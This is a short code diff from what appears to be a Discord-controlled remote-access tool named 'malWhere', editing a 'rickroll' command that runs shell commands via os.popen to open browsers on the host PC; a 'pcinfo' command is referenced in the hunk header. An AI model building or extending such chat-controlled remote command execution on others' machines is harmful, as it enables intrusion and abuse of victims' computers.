@@ -125,11 +125,11 @@ async def pcinfo(ctx):
 @malWhere.command()
 async def rickroll(ctx):
   try:
-    os.popen("chrome https://www.youtube.com/watch?v=dQw4w9WgXcQ")
-    os.popen("firefox https://www.youtube.com/watch?v=dQw4w9WgXcQ")
-    os.popen("opera https://www.youtube.com/watch?v=dQw4w9WgXcQ")
-    os.popen("brave https://www.youtube.com/watch?v=dQw4w9WgXcQ")
-    ctx.message.delete()
+    os.popen("start chrome.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+    os.popen("start firefox.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+    os.popen("start opera.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+    os.popen("start brave.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+    await ctx.message.delete()
   except:
     ctx.message.send("An Error Has Occured Please Try Again")
 
